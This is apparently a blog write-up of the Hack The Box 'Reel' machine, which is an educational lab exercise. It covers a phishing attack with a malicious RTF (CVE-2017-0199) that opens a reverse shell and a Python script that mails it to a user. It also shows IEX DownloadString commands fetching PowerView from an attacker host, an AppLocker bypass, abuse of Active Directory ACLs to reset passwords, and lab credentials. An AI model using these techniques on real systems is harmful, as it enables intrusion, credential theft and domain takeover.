---
layout: post
title: Hack The Box - Reel
---

It's been a while since I've posted a write-up about a Hack The Box machine in here. I had several candidates to write a post about, but finally I think the one I enjoyed the most was **Reel**. This fantastic box had me work on it over the span of two months, and when finally I reached admin I was astonished of how cool the ride had been. So let's see how it went!

## Enumeration

Of course, the first thing we do is `nmap`-ing to see what we are facing here and how to approach it:

```
# nmap -sC -sV -oA nmap/initial -v 10.10.10.77

Nmap scan report for 10.10.10.77
Host is up (0.075s latency).
Not shown: 992 filtered ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (EdDSA)
25/tcp    open  smtp?
| fingerprint-strings:
|   DNSStatusRequest, DNSVersionBindReq, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessi
onReq, X11Probe:
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello:
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help:
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2018-09-21T13:55:07+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2018-09-21 14:55:05
|_  start_date: 2018-09-21 14:09:20

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 21 14:55:44 2018 -- 1 IP address (1 host up) scanned in 223.33 seconds
```

That's quite an interesting attack surface we have right here! There's no web service listening on this box, so right away we see this isn't going to be the typical webapp-exploit-then-root machine, which is cool!

Whenever I see FTPs, the first thing I always try is anonymous login, so let's go for that. 

```
# ftp 10.10.10.77

Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
```
Perfect! Let's see what documents we can download:

```
ftp> cd documents
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
```
After promptly getting the three files, we, as good kids, read the `readme.txt` first, because that's what we are supposed to do, right?

```
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

Hmmm. Converting RTFs to what? DOCX maybe? Since the other documents in the directory are Microsoft Word documents, that seems a reasonable guess to make. Now, I am unable to read `Windows Event Forwarding.docx`, my LibreOffice spits out an error everytime I try, but I have more luck with `AppLocker.docx`. It says:

```
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

Ok, bad news. This probably means we will have to face `AppLocker` once we get a shell on the box. But we are far from that! So, now what?

## The wonders of metadata

We have a good amount of information from our enumeration phase. Now it's time to craft a meticulously planned several-stage attack... or to bang our heads against the machine until something works. Yay, *hacking*!

We know from our `nmap` scan that the server has an SMTP service listening at port 25, which kind of sticks out now because of the `readme.txt` we previously read. So *maybe* we are capable of using this SMTP server to send e-mails, but to whom?

Well, whoever wrote/converted the documents in the FTP server, she's probably a user of the machine and therefore a potential victim. So is there a chance her user account is somewhere in the generated documents?

Now, I have a confession to make. I don't usually add it to my writeups unless it gives some useful information, but I use `exiftool` on almost EVERYTHING I find during reconaissance when solving CTFs or doing pentest. It's probably some kind of derangement that affected me after my first three or four CTF-like machines involved searching for metadata in images or documents.

So you can imagine I got really happy when I ran `exiftool` on the three documents and one of them was bingo:

```
# exiftool Windows\ Event\ Forwarding.docx
ExifTool Version Number         : 11.16
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 14 kB
File Modification Date/Time     : 2018:09:21 14:53:40+02:00
File Access Date/Time           : 2018:10:21 10:43:29+02:00
File Inode Change Date/Time     : 2018:09:30 21:12:19+02:00
File Permissions                : rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 14
Paragraphs                      : 4
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 :
Company                         :
Links Up To Date                : No
Characters With Spaces          : 2004
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000
```

Do you see that beautiful `Creator` field over there? We got an e-mail address, and probably a user of the box too!

Now I can actually make some kind of attack plan as if this was some cool heist movie (I know this is cheesy but don't ruin this for me ok?):

1. Craft a malicious RTF document (research on how to this because I've never done something similar!)
2. Use the SMTP service running on the box to send it to `nico@megabank.com`, hoping he'll open it in a vulnerable Word version in order to convert it
3. Wait patiently for the shell

Yeah, seems easy right? (*Narrator*: it was not)

## Malicious documents

The first thing we should do is searching for a suitable (and somewhat recent) exploit that could affect `nico` when he opens our RTF document. Our best friend `searchsploit` to the rescue!

```
# searchsploit microsoft word rtf

---------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                      |  Path
                                                                                                    | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------- ----------------------------------------
Microsoft Office Word - '.RTF' Malicious HTA Execution (Metasploit)                                 | exploits/windows/remote/41934.rb
Microsoft Word - '.RTF' Remote Code Execution                                                       | exploits/windows/remote/41894.py
Microsoft Word - '.RTF' pFragments Stack Buffer Overflow (File Format) (MS10-087) (Metasploit)      | exploits/windows/local/16686.rb
Microsoft Word - RTF Object Confusion (MS14-017) (Metasploit)                                       | exploits/windows/local/32793.rb
Microsoft Word 2007 - RTF Object Confusion (ASLR + DEP Bypass)                                      | exploits/windows/local/36207.py
---------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Okay, good enough. Most of these seem pretty old (MS10-087, MS14-017, Microsoft Word 2007...), but the first one sounds better. And also it's available in Metasploit, which is great if you are a script kiddie like me! A quick inspection of the exploit file with `searchsploit -x 41934` reveals the CVE field (`2017-0199`) which, apart from looking more recent, is a fantastic field for searching in Metasploit. Let's give it a try:

```
# msfdb run

msf > search CVE-2017-0199

Matching Modules
================

   Name                                        Disclosure Date  Rank       Check  Description
   ----                                        ---------------  ----       -----  -----------
   exploit/windows/fileformat/office_word_hta  2017-04-14       excellent  No     Microsoft Office Word Malicious Hta Execution
```

Great, we got our candidate exploit, let's see what it does:

```
msf > use exploit/windows/fileformat/office_word_hta

msf exploit(windows/fileformat/office_word_hta) > show options

Module options (exploit/windows/fileformat/office_word_hta):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.doc          yes       The file name.
   SRVHOST   0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH   default.hta      yes       The URI to use for the HTA file


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word
```

Okay, from the `info` and `options` we can guess it creates a malicious document which, if opened with a vulnerale version of Microsoft Word, will download an `HTA` file from our local server, which in turn will execute the code we want. That's cool!

After setting the appropiate options and payload (the good old `windows/x64/shell/reverse_tcp`), we are set to go. By running `exploit`, the malicious document is generated in `/root/.msf4/local/msf.doc` and a web server starts listening, offering our little `default.hta` file. Also, the handler for our payload is started.

Now, how do we use the SMTP server to send the document to nico? Well, unless some credentials are needed, connecting and using an SMTP server should be straightforward, and more so if you [steal some code from StackOverflow](https://stackoverflow.com/questions/1966073/how-do-i-send-attachments-using-smtp#8243031) and smash it together hoping for the best. The script I ended up ensembling (in lack of a better word) looks like this:

```python
# Import smtplib for the actual sending function
import smtplib

# For guessing MIME type
import mimetypes

# Import the email modules we'll need
import email
import email.mime.application

import sys

# Create a text/plain message
msg = email.mime.Multipart.MIMEMultipart()
msg['Subject'] = 'Greetings'
msg['From'] = 'hey@megabank.com'
msg['To'] = 'nico@megabank.com'

# The main body is just another attachment
body = email.mime.Text.MIMEText("""Hello, how are you? I am fine.
        This is a rather nice letter, don't you think?""")
msg.attach(body)

filename=sys.argv[1]

fp=open(filename,'rb')
att = email.mime.application.MIMEApplication(fp.read(),_subtype="rtf")
fp.close()
att.add_header('Content-Disposition','attachment',filename=filename)
msg.attach(att)

s = smtplib.SMTP('10.10.10.77')
s.ehlo()
s.sendmail('hey@megabank.com',['nico@megabank.com'], msg.as_string())
s.quit()
print "Sent!"
```

As you can see, what it does is simply crafting and e-mail with subject "Greetings", from "hey@megabank.com", to "nico@megabank.com", some stupid text and the malicious file attached to it (specified when calling the script), and then it connects to Reel and tries to use the SMTP server to send it. What do we have to lose?

```
# cp /root/.msf4/local/msf.doc .
# python send_mail.py msf.doc

Sent!
```

And now we just wait...

And wait...

Nothing. Damn it!

### Double check your payloads

I have to admit I lost *a lot* of time here. I thought that maybe the Word version used by nico wasn't vulnerable to this exploit. I considered trying to exploit one of the other services of the box. I tried to send the document manually connecting to the SMTP to no avail. I tried to rename the document to `msf.rtf` just in case nico only opened files with the RTF extension. Nothing. I was lost in the darkness.

But then I realized a little something. I stopped the web server used by Metasploit, copied the malicious document to another directory and listened there on the same port with `SimpleHTTPServer`. And after sending the e-mail again, I saw the HTA document was actually being requested! So, the problem was the HTA file itself, i.e. the payload... The payload I used when generating the document was `windows/x64/shell/reverse_tcp`. For some reason (probably other failures in previous boxes) I assumed the machine was 64 bit. But that's a big assumption to make, specially with 0 data supporting it. I changed the payload to `windows/shell/reverse_tcp`, repeated the process, closed my eyes and waited.


```
msf exploit(windows/fileformat/office_word_hta) > run
[*] Exploit running as background job 1.

[*] Started reverse TCP handler on 10.10.12.157:443
[+] msf.rtf stored at /root/.msf4/local/msf.rtf
[*] Using URL: http://10.10.12.157:80/default.hta
[*] Server started.

# cp /root/.msf4/local/msf.rtf .
# python send_mail.py msf.rtf
Sent!

[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.77
[*] Command shell session 1 opened (10.10.12.157:443 -> 10.10.10.77:49954) at 2018-11-07 11:49:01 +0100

```

Suddenly, everything in life was perfect.

# Nico

We finally have a shell on this box. It's going to be easy from here, right? Of course, that malicious document thing is the peak of difficulty of this machine, is it not? (*Narrator*: again, it was not)

Normally, my first serious move when landing on a Windows machine is running `PowerUp.ps1`, analyze the results and work from there. But, before that, I like to peek around, at least the home directory of the user I've accessed with. So, to `C:\Users\nico\` we go!

In his `Desktop`, aside from the `user.txt` flag (yay!), there's an interesting file called `cred.xml`:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

Hey, I know the type `PSCredential`! As the name of the file suggests, it probably contains credentials, and judging by its contents, they belong to the user `tom`. That's great! It's only a matter of researching what type of file is this and how to obtain the plain-text password from it. After googling a little, [two][1] StackOverflow [answers][2] help me understand that this file is the XML representation of a serialized Powershell object, more specifically a `PSCredential` one. And that the Powershell command `Import-Clixml` can help us undoing the process:

```
> powershell (Import-Clixml cred.xml).GetNetworkCredential().Password
1ts-mag1c!!!
```

Alright, this is going well!

## Tom

Luckily for us, SSH is listening on this box, so we don't have to rely on the shell obtained through the Word exploit. Let's just log in as Tom like a completely legitimate user.

Again, peeking on Tom's Desktop reveals another interesting folder: `AD Audit`. 

```
> dir
  Volume in drive C has no label
  Volume Serial number is CC8A-33E1

  Directory of C:\Users\tom\Desktop\AD Audit

05/29/2018	08:02 PM	<DIR>		.
05/29/2018	08:02 PM	<DIR>		..
05/29/2018	11:44 PM	<DIR>		BloodHound
05/29/2018	08:02 PM		    182	note.txt
		    1 File(s)		      182 bytes
		    3 Dir(s)      15,719,768,064 bytes free
```

BloodHound! This is going to be interesting... But let's read `note.txt` first:

```
> type note.txt
Findings:

Surprisingly, no AD attack paths from user to Domain Admin (using default shortest path query).

Maybe we should re-run Cypher query against other groups we've created.
```

OK, big hint here. BloodHound out-of-the-box didn't find a way to escalate from user to DA, so probably we have to use it in a not-so-default way to find something juicy. At this point, I had to research (a.k.a. googling) again because, even though I knew the tool, I had never used it.

In short, BloodHound is a *fantastic* tool that helps analyzing an AD environment in order to find ways low-privileged users could escalate to Domain Admins, moving through other users and groups until reaching their traget. It's not only that BloodHound comes with *a lot* of scripts that help with the task of obtaining this information (called *Ingestors*), but it also has a beautiful GUI which presents it in a graph format, showing relations between entities (mainly AD users and groups) and allowing you to query this graph and find whatever you need. For more information you can refer to [BloodHound's wiki on GitHub][3] and the wonderful DEF CON presentation [Six Degrees of Domain Admin][4].

At this point, it's more or less clear what we need to do:

1. Run the BloodHound Ingestors to obtain the raw data of the AD environment
2. Extract the data to our Kali (so we have a GUI to see the graphs)
3. Install and launch BloodHound, and feed it with Reel's AD data
4. Query the graph until a path from `tom` to Admin is found

Great, let's get to work!

Firstly, we need to run Powershell, since SSH logs us into a simple CMD shell. Then, we'll be able to load BloodHound into the context:

```
> powershell
> cd 'C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors'
> .\SharpHound.ps1
.\SharpHound.ps1 : File C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\SharpHound.ps1 cannot be loaded because its
operation is blocked by software restriction policies, such as those created by using Group Policy.
At line:1 char:1
+ .\SharpHound.ps1
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```

Oops! Remember the AppLocker document we found during our enumeration phase? `.ps1` files are restricted by AppLocker, so we won't be able to run scripts this way. But we know interactive Powershell actually works, since we used it in our initial exploit and right now in our shell. This means we can easily bypass AppLocker by simply using `IEX` and `Get-Content` like this:

```
> Get-Content SharpHound.ps1 -raw | IEX
```

### About versions, CSVs and JSONs

Now, I'll save you some time and tell you a little spoiler. The version of BloodHound installed on Reel is an old one (`1.5.2`), which used CSV as the format for the collected data. If you happened to install the most recent BloodHound on your attacker box, this data won't be accepted by it, since BloodHound 2 onwards expects data in JSON format. So you have two options: either you install BloodHound 1.5.2 on your box, or you load BloodHound's most recent Ingestor into Reel. I tried both ways, and I think the second one is easier. So let's do that.

After cloning the latest BloodHound version from GitHub on our attacker box, we can just use python's `SimpleHTTPServer` to serve `Ingestors/SharpHound.ps1` and get it from Reel:

```
> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.12.157/SharpHound.ps1')
```

And now we can run the `Invoke-BloodHound` function to gather the needed data, but first we'll need to move to a directory in which we can write without risk of overwriting anything or not having write permissions:

```
> cd C:\Windows\TEMP
> Invoke-BloodHound -CollectionMethod All
```

Let's go big and use `-CollectionMethod All` since the `note.txt` file mentioned the default query didn't find anything, so we'll need all the data we are able to gather. After some time, the command ends and we see several files were created: `.json` files, a `.bin` file and a `.zip` file. What BloodHound needs is the ZIP file (which contains all the generated JSONs), so let's obtain it with SCP since we have SSH available :)

```
# scp tom@10.10.10.77:'"C:\Windows\TEMP\20181107184135_BloodHound.zip"' .
tom@10.10.10.77's password:
20181107184135_BloodHound.zip			                                                                      100%   8.2K  66.8MB/s   00:00
```

(FTR, I had to use both single (`'`) and double (`"`) quotes for the path to be correctly interpreted by both SSH and Windows)

## Planning the attack with BloodHound

Great! Time to launch BloodHound! It needs `neo4j` to be running, so let's get that too:

```
# neo4j console
# bloodhound
```

After being shown the cool BloodHound logo, we can use the `Upload Data` button on the right panel and select the ZIP file to load Reel's data into BloodHound. Some seconds later, we can see a graph containing the `DOMAIN ADMINS@HTB.LOCAL` group, with its three members, none of them accessible by us. Well, it seems the `note.txt` file was right and we'll need to dig deeper. Let's start by seeing which paths are accessible from our current user, `tom`.

By writing `tom` in the upper search bar, BloodHound rapidly suggests the node `TOM@HTB.LOCAL`, which we can select. Then, by clicking on the graph node, all the collected info about Tom is shown to us. We are interested in the `Outbound Object Control` section, which shows which other AD objects `tom` has control over. We are shown the following graph:

![Tom's path to victory](/images/reel-bloodhound-tom.png)

Right away, we see an interesting path:

1. Tom has `WriteOwner` permissions over Claire
2. Claire has `WriteDacl` permissions over the group `BACKUP_ADMINS`
3. `BACKUP_ADMINS` sounds interesting :)

Again, I have to admit I had no idea about what exactly `WriteOwner` and `WriteDacl` meant or allowed me to do, so it was time to ~~furiously google~~ research again. I ended up finding [*the* article][6] (written by the authors of BloodHound themselves) that helped me understand what could be done with this attack path.

In short, `WriteOwner` means Tom can become the owner of Claire's AD Object, meaning he can then fully control any of its properties (one of them being her password). On the other hand, `WriteDacl` means Claire can change the Access Control Lists (ACL) of the `BACKUP_ADMINS` group, which in turn can be used to add herself to that group. By doing this, we can escalate from Tom to Claire, then to the `BACKUP_ADMINS` group, and then explore what the members of this group can do.

## Executing the attack with PowerView

In order to easily take advantage of the `WriteOwner` and `WriteDacl` permissions, we'll use `PowerView`, which is part of the excellent [PowerSploit][7] collection (remember to use the `dev` branch!). Again, let's use `SimpleHTTPServer` to download `PowerView.ps1` (it's in the `Recon` directory) into Reel:

```
> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.12.157/PowerView.ps1')
```

Ok, we got our tools. Let's play.

First, we'll confirm we have `WriteOwner` access over Claire as Tom:

```
> $tomSid = Get-DomainUser tom | Select-Object -ExpandProperty objectsid
> Get-DomainObjectACL claire -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $tomSid}
                           
AceType               : AccessAllowed
ObjectDN              : CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL
ActiveDirectoryRights : WriteOwner
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1130
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False 
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2648318136-3688571242-2924127574-1107
AccessMask            : 524288
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

Great, we have. Now let's become Claire's owner and reset her password!

```
> Set-DomainObjectOwner -Identity claire -TargetIdentity tom
> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
```

Did it work?

```
> Get-DomainObjectACL claire -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $tomSid}

AceQualifier           : AccessAllowed
ObjectDN               : CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-2648318136-3688571242-2924127574-1130
     
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2648318136-3688571242-2924127574-1107
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceType               : AccessAllowed
ObjectDN              : CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1130
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2648318136-3688571242-2924127574-1107
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

It seems so! We should be able to set the password we want now:

```
> $secPaswd = ConvertTo-SecureString -String 's0mepassw0rd' -AsPlainText -Force
> Set-ADAccountPassword -Reset -NewPassword $secPaswd -Identity claire
```

We should be able to login as Claire with `s0mepassw0rd` as password now...

```
# ssh claire@10.10.10.77
claire@10.10.10.77's password:

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

claire@REEL C:\Users\claire>
```

Amazing!

## Claire

Ok, we are near! We only need to do something similar for the `BACKUP_ADMINS` group and see what being part of it means.

Of course, since we changed users, we need to load `PowerView` again:

```
> powershell
> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.12.157/PowerView.ps1')
```

And again guided by the fantastic [*An Ace Up The Sleeve*][6] article, we can grant ourselves all ACL rights over `BACKUP_ADMINS`, since we have the `WriteDacl` permission:

```
> Add-DomainObjectACL -TargetIdentity 'Backup_Admins' -PrincipalIdentity claire -Rights All
```

With these rights, we should be able to add ourselves to the group:

```
> net group Backup_Admins /add claire
```

No errors, seems good! We can check it worked by running `net user claire` and seeing we are indeed a proud member of `BACKUP_ADMINS`. Great! Now what?

### Note

At this point, while I was exploring Claire as a `BACKUP_ADMINS` member, other Hack The Box users were constantly resetting Claire's password to other values, so if I logged out (you will see why in a moment) I couldn't log back in. I ended up leaving Tom's SSH session open and prepared a script to automate the process of resetting Claire's password to the value I wanted so, if someone changed it, I could easily change it back. My `ResetClairePassword.ps1` script was like this:

```powershell
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$SecPasswd = ConvertTo-SecureString -String 's0mepassw0rd' -AsPlainText -Force
Set-ADAccountPassword -Reset -NewPassword $SecPasswd -Identity claire 
```

## Backup Admin

Another shameful confession. I wasted a lot of time at this point, and it was pretty frustrating. It required a lot of work reaching to this point, and it seemed it was for nothing. I couldn't access `Administrator` home directory, I couldn't read or write new files compared to "base" Claire, `BACKUP_ADMINS` didn't have any control over other AD objects according to BloodHound... So, was all this work for nothing?!

...Turns out you have to log out and log in again for group changes to take effect. It's something obvious, it's something I knew from Linux (it works the same way there), but my tired brain couldn't remember it and that meant a lot of frustation and wasted time wandering around. Lesson learned (even though I thought I already knew this): if you are tired, take a break! Even if you feel the victory so near you could touch it, working with a tired mind almost always doesn't pay off.

Ok, after this dramatic complication, we can continue! Log out, log in again, and the group change takes effect. Now, as Claire, we can access `C:\Users\Administrator`. Finally!! Let's read `root.txt` and claim our well deserved prize:

```
claire@REEL C:\Users\Administrator\Desktop>type root.txt
Access is denied.
```

God dammit!

It couldn't be that easy, right? It seems there are other things in `Administrator`'s Desktop. Let's see what this `Backup Scripts` folder is.

```
> cd "C:\Users\Administrator\Desktop\Backup Scripts"
> dir
  Volume in drive C has no label
  Volume Serial number is CC8A-33E1

  Directory of C:\Users\Administrator\Desktop\Backup Scripts

11/02/2017	09:47 PM	<DIR>		.
11/02/2017	09:47 PM	<DIR>		..
11/03/2017	11:22 PM		    845	backup.ps1
11/02/2017	09:37 PM		    462	backup1.ps1
11/03/2017	11:21 PM		  5,642	BackupScript.ps1
11/02/2017	09:43 PM		  2,791	BackupScript.zip
11/03/2017	11:22 PM		  1,855	folders-system-state.txt
11/03/2017	11:22 PM		    308	test2.ps1.txt
		    6 File(s)		  11,903 bytes
		    2 Dir(s)      15,719,768,064 bytes free
```

Alright, it's just digging work at this point. After reviewing these scripts one by one (which seem to be used to automate the backup process of some directories of the box), we finally find what we are looking for:

```
> type BackupScript.ps1
# admin password                                                                                                
$password="Cr4ckMeIfYouC4n!" 
[...]
```

Is this it? Are we done?

```
# ssh Administrator@10.10.10.77
Administrator@10.10.10.77's password:

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

administrator@REEL C:\Users\Administrator>
```

\o/

## Conclusion

I enjoyed this machine *a lot*. Some time ago, I decided to focus on Windows machines in Hack The Box precisely because I knew my knowledge about the more recent techniques was very limited. And after solving a couple of easy ones, I stumbled upon Reel and found exactly what I was looking for. Even though I had read about all these things before, I had never actually used a Microsoft Word exploit, BloodHound or PowerView. It was great to put all these wonderful tools in practice and understanding them a little better (of course I'm not by any means an expert with any of them, there's a lot more to be done!), and I truly appreciate the amount of work dedicated to this box so noobs like me can practice and learn all these cool things.

In short, big, *big* thanks to [egre55][8] for creating this wonderful machine, to Hack The Box for hosting it and to you for reading this *long* write-up, if you managed to not fall sleep halfway.

See you in the next one!

[1]: https://stackoverflow.com/questions/21741803/powershell-securestring-encrypt-decrypt-to-plain-text-not-working
[2]: https://stackoverflow.com/questions/18747942/how-to-use-a-powerhsell-serialized-object
[3]: https://github.com/BloodHoundAD/Bloodhound/wiki
[4]: https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Robbins-Vazarkar-Schroeder-Six-Degrees-of-Domain-Admin.pdf
[5]: https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collector
[6]: https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf
[7]: https://github.com/PowerShellMafia/PowerSploit.git
[8]: https://www.hackthebox.eu/home/users/profile/1190


